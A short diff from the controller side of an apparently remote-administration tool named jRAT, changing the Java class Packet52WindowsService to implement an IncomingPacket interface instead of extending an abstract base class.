@@ -5,7 +5,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlServices;
 
 
-public class Packet52WindowsService extends AbstractIncomingPacket {
+public class Packet52WindowsService implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
